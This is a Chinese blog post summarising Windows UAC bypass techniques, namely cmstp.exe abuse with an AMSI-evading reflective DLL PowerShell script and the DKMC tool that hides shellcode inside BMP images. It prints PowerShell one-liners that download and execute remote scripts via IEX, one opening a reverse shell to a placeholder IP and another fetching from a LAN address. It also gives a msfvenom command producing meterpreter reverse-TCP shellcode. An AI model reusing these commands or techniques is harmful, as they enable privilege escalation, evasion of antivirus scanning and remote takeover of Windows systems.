---
layout:     post
title:      Bypass UAC的一些总结
date:       2018-12-16
author:     Wh0ale
header-img: img/wallhaven-326425.jpg
catalog: true
tags:
    - Bypass UAC
---

这几天看到的bypass 方法比较多，趁今天有空做个总结

一、利用microsoft的 “cmstp.exe”作为绕过UAC

其主要原理采用c#生成带有dll反射的的powershell脚本，amsi检测不到

关于amsi的文章参考：

https://xz.aliyun.com/t/3095

这里的文件编译号生成为dll文件

![2.png](https://www.t00ls.net/attachment.php?aid=NzEzMzN8YjVlN2RjNDV8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes)

![3.png](https://www.t00ls.net/attachment.php?aid=NzEzMzR8ZWE2ZTRjOGR8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes)

执行即可弹出administrator的命令行

另附自动化脚本放在附件里

![1.png](https://www.t00ls.net/attachment.php?aid=NzEzMzV8NTE4ZGZmMjF8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes)

 

这里看到与表哥复现

通过远程iex下载我们的执行命令脚本

生成一个一个直接执行命令的exe

①powershell iex (New-Object Net.WebClient).DownloadString('http://InvokePowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] 

②powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.211.179:80/a'))" 

但是如何修改代码生成可执行命令的exe和脚本，还没弄懂  有时间大佬可以研究研究

二、DKMC

使用方法：

(gen) Generate a malicious BMP image //创建一张恶意BMP格式的图片 

(web) Start a web server and deliver malicious image //启动web服务（内置）并传送恶意图片 

(ps) Generate Powershell payload //创建Powershell 有效载荷 

(sc) Generate shellcode from raw file //从原始文件生成shellcode 

(exit) Quit the application //退出

生成shellcode
kali ip： 192.168.0.107
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=9999 -f raw  > /opt/shellcode
![4.png](https://www.t00ls.net/attachment.php?aid=NzEzMzZ8MDkyY2ZjNDV8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
DKMC生成shellcode
![5.png](https://www.t00ls.net/attachment.php?aid=NzEzMzd8ZGIwNzUyMWJ8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
![6.png](https://www.t00ls.net/attachment.php?aid=NzEzMzl8YzdmYjdhMTh8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
![7.png](https://www.t00ls.net/attachment.php?aid=NzEzNDB8MWQzNzFjNDN8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
![8.png](https://www.t00ls.net/attachment.php?aid=NzEzNDF8OGU5NTI5M2R8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
![9.png](https://www.t00ls.net/attachment.php?aid=NzEzNDJ8YjAzNWVmOTh8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
这个之前尝试是可以弹shell的，今天不知道为啥不行.....我改天再试试看，原理就是把shellcode放入bmp文件中	